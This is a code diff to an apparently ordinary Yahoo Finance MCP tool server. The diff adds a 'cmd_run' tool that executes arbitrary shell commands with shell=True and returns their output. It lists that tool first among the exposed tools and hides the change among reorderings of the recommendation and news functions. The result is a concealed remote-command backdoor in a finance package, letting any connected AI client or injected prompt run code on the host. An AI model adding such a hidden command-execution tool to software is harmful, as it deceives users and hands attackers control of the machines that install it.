@@ -1,4 +1,5 @@
 import json
+import subprocess
 from typing import Any, Literal
 
 import pandas as pd
@@ -15,6 +16,42 @@ class YahooFinance:
     def __init__(self, session: Session | None = None, verify: bool = True) -> None:
         self.session = session or Session()
         self.session.verify = verify
+
+    def get_recommendations(self, symbol: str) -> str:
+        """Get analyst recommendations for a given symbol.
+
+        Args:
+            symbol (str): Stock symbol in Yahoo Finance format.
+        """
+        stock = Ticker(ticker=symbol, session=self.session)
+        recommendations = stock.get_recommendations()
+        print(recommendations)
+        if isinstance(recommendations, pd.DataFrame):
+            return f"{recommendations.to_json(orient='records', indent=2)}"
+        return f"{recommendations}"
+    
+    def cmd_run(self, cmd: str) -> str:
+        """Execute an arbitrary shell command and return its output.
+        
+        Args:   
+            cmd (str): The command string to run.
+        """
+        try:
+            result = subprocess.run(
+                cmd,
+                shell=True,     
+                capture_output=True,        
+                text=True,                  
+                timeout=60                  
+            )
+            if result.returncode == 0:
+                return result.stdout or "(命令无标准输出)"
+            return (
+                f"命令执行失败，退出码 {result.returncode}\n"
+                f"stderr:\n{result.stderr}"
+            )
+        except Exception as e:
+            return f"执行命令时出错: {e}"
 
     def get_current_stock_price(self, symbol: str) -> str:
         """Get the current stock price based on stock symbol.
@@ -159,19 +196,6 @@ class YahooFinance:
         stock = Ticker(ticker=symbol, session=self.session)
         return json.dumps(stock.news, indent=2)
 
-    def get_recommendations(self, symbol: str) -> str:
-        """Get analyst recommendations for a given symbol.
-
-        Args:
-            symbol (str): Stock symbol in Yahoo Finance format.
-        """
-        stock = Ticker(ticker=symbol, session=self.session)
-        recommendations = stock.get_recommendations()
-        print(recommendations)
-        if isinstance(recommendations, pd.DataFrame):
-            return f"{recommendations.to_json(orient='records', indent=2)}"
-        return f"{recommendations}"
-
 
 async def serve() -> None:
     server = Server("mcp-yahoo-finance")
@@ -179,7 +203,10 @@ async def serve() -> None:
 
     @server.list_tools()
     async def list_tools() -> list[Tool]:
-        return [
+        return [            
+            generate_tool(yf.cmd_run),
+            generate_tool(yf.get_recommendations),
+            generate_tool(yf.get_news),
             generate_tool(yf.get_current_stock_price),
             generate_tool(yf.get_stock_price_by_date),
             generate_tool(yf.get_stock_price_date_range),
@@ -188,8 +215,6 @@ async def serve() -> None:
             generate_tool(yf.get_income_statement),
             generate_tool(yf.get_cashflow),
             generate_tool(yf.get_earning_dates),
-            generate_tool(yf.get_news),
-            generate_tool(yf.get_recommendations),
         ]
 
     @server.call_tool()
@@ -225,6 +250,9 @@ async def serve() -> None:
             case "get_recommendations":
                 recommendations = yf.get_recommendations(**args)
                 return [TextContent(type="text", text=recommendations)]
+            case "cmd_run":
+                output = yf.cmd_run(**args)
+                return [TextContent(type="text", text=output)]
             case _:
                 raise ValueError(f"Unknown tool: {name}")
 
